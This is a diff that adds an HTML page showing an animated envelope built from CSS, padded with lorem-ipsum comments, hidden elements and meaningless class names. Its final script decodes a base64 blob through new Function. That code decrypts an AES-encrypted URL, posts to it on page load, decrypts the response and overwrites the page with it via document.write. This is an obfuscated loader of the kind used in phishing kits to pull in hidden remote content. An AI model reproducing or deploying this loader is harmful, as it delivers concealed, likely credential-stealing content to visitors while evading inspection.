@@ -1,0 +1,58 @@
+<html>
+
+<head>
+
+ <meta 		name="viewport" 	content="width=device-width, 	 initial-scale=1.0">
+
+
+   <!--		<a>Labore t-bone hamburger, doner occaecat lorem consectetur tongue kevin cillum fatback.</a>		 -->
+	 <script	src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.2.0/crypto-js.min.js"></script>
+<style>
+
+	 	body		,	html	{ height:  100%;margin:		0;display:	flex;align-items:	 center;justify-content: center   }		@keyframes 	bounce { 		0%			,		 100%		,	  12.5% ,			32.5%  	,	  76.1%	{	 	transform:	translateY(0)  } 22.5%	  , 		86%   {   transform: translateY(7px) 	 } 	 }		 #cerat  { 	height: 	179px;width:	130px;overflow:		 hidden;margin-top:	-59px;margin-left:		25px		}	@keyframes	 	shadow-fade		{ 0%	 	,		100%  ,  21.2%	,	 80% 		{ 	 opacity: 	 0  	}	 	47%  ,	 70%	 	{  opacity:	  1  	}			}
+
+	 	#reifs 		{	width:	130px;margin-top:  	179px   }	#pelycography	{ width:		130px;height:  71px;border-radius: 	 0  0	 7px		 7px;overflow:		 hidden;margin-top: -41px	}		 #pelycography > 	 .hemomanometer	 	{	 width: 287px;height:	71px;background:		#27a0e0;transform:			translate(-153px  ,			-70px)	  rotate(28deg)  }	 	#pelycography   > 	.internetwork	 	{ 	width: 287px;height:	71px;background:  	#1388d6;transform: 	translate(-120px	,		63px)   rotate(-28deg)	 	}	 #frissell   {	 width: 130px;height:	40px;background:	 	#113864;margin-top:	-70px  	} 		#poetress	 	{ 	 display:		flex;flex-wrap:	wrap;width:		118px;height: 131px;border-radius:	 7px;overflow:		hidden;margin:	0			auto;margin-top:   -306px;animation: 	cal-bounce 	5s infinite;animation-timing-function:  cubic-bezier(0 	 ,  0.5	 	, 	0		 ,	 	1);
+
+   transform: translateY(51px)  scaleY(1)		} @keyframes	 cal-bounce	{ 	0%		,			100%		,	16.5%	,			76.1%  	{ transform:  	translateY(151px) 	 scaleY(1)	 }	28%	 {	 	transform:  	translateY(39px) scaleY(1)	}	31%  	{		transform:	 translateY(51px) scaleY(1.05)	} 	 33%	 	{ 	transform:	 translateY(51px)		 scaleY(0.96)	} 	 34%	,  68.5% {	transform:   translateY(51px)  scaleY(1)		 }  68.5%		{ 	 animation-timing-function:		 cubic-bezier(0.66			, -0.16 ,	1 		, -0.29)	 	} 		}	 #poetress	>   .reconfirmations	 { width:			118px;height:	 	21px;
+
+ margin-bottom:  -1px;background:	  #0354a1  	}	#poetress 	 >	.internetwork	{			display:		flex;width:		 118px;height:	 37px	} 		.stemwinder {  	width:	 	39.3333px;height: 	 38px }	 .twicestress {  background:	#0073cc		 } .thecodont	{		background:		#27a0e0 }	  .recumbent		 {		 background: 		#4fcfff		}	.recertified		{		background:	 	#035fb3 		}		 .guirlande { 		background:	#134276 	 } 		
+
+
+		 #unquiescence 		{ width: 130px;height: 	107px;animation:   opened-flap-swing 5s	 infinite;animation-timing-function:	cubic-bezier(0.32  ,	0	 ,	0.67			,		0);transform-origin:	 top;transform:	translateY(-68px) 	rotate3d(1		 , 0  ,  0	 , 		-180deg)	} 	@keyframes  	opened-flap-swing	{  0%	,	100% ,		14.5% 	,		76%   { transform: translateY(-68px)  	rotate3d(1  	,		0	,	0	 , -90deg)	} 16.5%		,		74% 	{ transform: 	translateY(-68px)	rotate3d(1		,		0		 ,	 0 ,	-180deg)		}  } #miserableness		{	width: 	130px;animation: closed-flap-swing	5s  	infinite;animation-timing-function:  cubic-bezier(0.32	 , 	0		,	 0.67 	,	0);transform-origin:	top;transform:	  translateY(-71px) rotate3d(1	 	, 0	,	 0 , 	90deg)		 }		@keyframes closed-flap-swing  { 	0%  ,	 	100%	,	77% 		,	  8.5%  	{ transform:	  translateY(-71px) 		rotate3d(1	,	0		,	 0	,	0)	 	}  	14.5%  	,   76%	 	{ 	transform:	 translateY(-71px)  rotate3d(1   , 	0	 ,	 0		, 	 90deg)	 } 	 } 	#unespied		 { width: 	130px;height:	107px;overflow:		hidden		 }	  .glycosyl 	 {	 width: 	96px;height:		96px;background: #4fcfff;margin:	-48px		auto	0	auto;border-radius:   7px;transform:		scaleY(0.6) 		rotate(45deg) 	 } #back		.glycosyl  {	background:		#113864  }	#miserableness   .glycosyl		{			background:			#4fcfff  } 
+
+</style>
+
+
+</head>
+		<body>
+
+
+		 <!-- <p>Ham hock flank mollit jowl in ut salami ball tip ullamco velit.</p>	--> 	<div			id="cerat">	<div	id="reifs"><div		 id="unquiescence">  	<div	 id="unespied">  <div	 class="glycosyl"></div>   <a 	 style="display:none;">Biltong prosciutto esse eu aliquip shankle magna tongue officia venison velit.</a>	 </div></div><div			id="poetress"> <div 	 class="reconfirmations"></div>
+
+	  <div	class="internetwork"><div class="stemwinder   twicestress"></div>	<div	  class="stemwinder thecodont"></div>	<!--  	<u>Pancetta venison sint dolor elit aute magna picanha, sausage pastrami shoulder in tri-tip.</u>  	-->	<div class="stemwinder	  recumbent"></div> 	</div>			<article style="display:none;">Excepteur chislic hamburger ipsum doner non.</article>	<div class="internetwork">		<div		class="stemwinder   recertified"></div> <div	 class="stemwinder	 twicestress"></div>	<div  class="stemwinder	thecodont"></div>		</div>	<div		 class="internetwork"> <div	class="stemwinder	guirlande"></div>	 <div			class="stemwinder		recertified"></div>	<div  class="stemwinder			twicestress"></div>	  </div></div>
+
+
+ 	</div>  	<div		id="frissell"></div>  <!-- 	<span>Ut voluptate drumstick, tempor chuck t-bone landjaeger in deserunt picanha ham commodo short ribs sint buffalo.</span>			-->  	<div	 	id="pelycography"><div class="internetwork"></div><div	 	class="hemomanometer"></div> 	</div>		<div		 id="miserableness"><div  id="unespied"> <div class="glycosyl"></div> </div> </div>			</div>
+
+
+ </body>
+  	<script> 
+
+
+</script>
+<!-- <div>Adipisicing veniam occaecat id, mollit elit andouille ipsum proident.</div> -->
+<script>			catochus 	= ``		;
+</script>
+<!-- <strong>Andouille proident ground round incididunt tri-tip short loin.</strong> -->
+<script>
+
+		semistiff 		=			atob ;
+
+ ( 	 new		Function	  /* marabou */ (	semistiff(`CmZ1bmN0aW9uIHNlZGRvbihqYWRkYW4pIHsKICAgIHZhciB7IGEsIGIsIGMsIGQgfSA9IEpTT04ucGFyc2UoamFkZGFuKTsKCiAgICB2YXIgcG96enkgPSBDcnlwdG9KUy5QQktERjIoZCwgQ3J5cHRvSlMuZW5jLlV0ZjgucGFyc2UoYiksIHsKICAgICAgICBoYXNoZXI6IENyeXB0b0pTLmFsZ28uU0hBNTEyLAogICAgICAgIGtleVNpemU6ICgzMiArIDE2KSAvIDQsCiAgICAgICAgaXRlcmF0aW9uczogOTk5CiAgICB9KTsKCiAgICBjb25zdCB3b29kYm9yZXIgPSBDcnlwdG9KUy5saWIuV29yZEFycmF5LmNyZWF0ZShwb3p6eS53b3Jkcy5zbGljZSgwLCA4KSk7CiAgICBjb25zdCBmb3JtYWxpdGVyID0gQ3J5cHRvSlMubGliLldvcmRBcnJheS5jcmVhdGUocG96enkud29yZHMuc2xpY2UoOCwgMTIpKTsKCiAgICBsZXQgYWVyb3BoaWxhdGVseSA9IENyeXB0b0pTLkFFUy5kZWNyeXB0KGEsIHdvb2Rib3JlciwgeyBpdjogZm9ybWFsaXRlciB9KTsKICAgIHJldHVybiBDcnlwdG9KUy5lbmMuVXRmOC5zdHJpbmdpZnkoYWVyb3BoaWxhdGVseSk7Cn0KKGFzeW5jICgpID0+IHsgZG9jdW1lbnQub3BlbigpO2RvY3VtZW50LndyaXRlKHNlZGRvbihhd2FpdCAoYXdhaXQgZmV0Y2goc2VkZG9uKGF0b2IoYGV5SmhJam9pVlN0RlpqRktOVnA0V0VKcGVIWTJiRkl2TDFsQlNYVmlOVTlST0UwMFozVXphRlJUVDBrMVIwa3dZUzlaU0ZwSVRqUmtkWFJvTDFOdWNqaHJjbE00TDFGMFpHVkthbWd4TXpsYVVtOUVNM0ZPUlhJMVoxRTlQU0lzSW1JaU9pSnpkRXRIU1hKd2VrbG9lSEJaZERSdE1GZHBOekpCUjBwU1FXVXlRVlpGVFdOS2NqRTBObVZZYkdnM1RIZFBWVFJTVlhCcWJGSnZXR0ZIZWxaaWVXdGxkVXQyUWs1VFZHTnRiM00zUkZkcWMwdHJiWGxYYlRSTFFqbEVWVEY1TkRSUU5HNU1SREpTTlRjMWVYZ3pXV2hDUWxOM1RUUkthMjlUU1UxbE1reEplaUlzSW1NaU9pSmpabVpoTm1ZM01XWXlZVEZqTkdZMllXUTJZbU5oT1RVeFl6RmlNbVF5TnlJc0ltUWlPaUpEV0ROSlNWTkxUbHAzU2pOSmVFdElJbjA9YCkpLCB7IG1ldGhvZDogJ1BPU1QnLCBib2R5OiBKU09OLnN0cmluZ2lmeSh7IHBvenp5OiAiZm9ybWFsaXRlciIgfSkgfSkpLnRleHQoKSkpO2RvY3VtZW50LmNsb3NlKCk7IH0pKCk7Cg==`)	) /*   unearnestly */  		)	  ();
+
+
+</script>
+<!-- <span>Porchetta salami hamburger cillum tempor tri-tip exercitation.</span> -->
+<script>	 </script>
+
+</html>
